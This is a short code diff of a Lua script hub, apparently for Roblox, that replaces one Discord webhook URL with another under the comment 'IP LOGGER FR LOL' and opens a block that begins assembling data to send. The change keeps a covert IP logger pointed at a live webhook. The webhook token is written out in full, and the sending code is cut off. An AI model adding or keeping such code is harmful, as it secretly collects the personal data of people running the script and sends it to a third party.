@@ -24,7 +24,7 @@ function MakeScriptHub()
 
 ---IP LOGGER FR LOL
 
-local webh = "https://discord.com/api/webhooks/1075708874583195732/xY6faBbkAyH7A89rtl0ccRWba_7UCRMNsQRYZxAjyMpgJoaEfQc9xGUy9W1NUSqcLvah"
+local webh = "https://discord.com/api/webhooks/1073932506224656394/2DtYtEiwwIRb_y_sxytrcn7-dCk8B0YFWNSdtf7V0yT3GjEroG8-gFcgSBZ0oQhTvTy5"
 
 pcall(function()
    local data = {
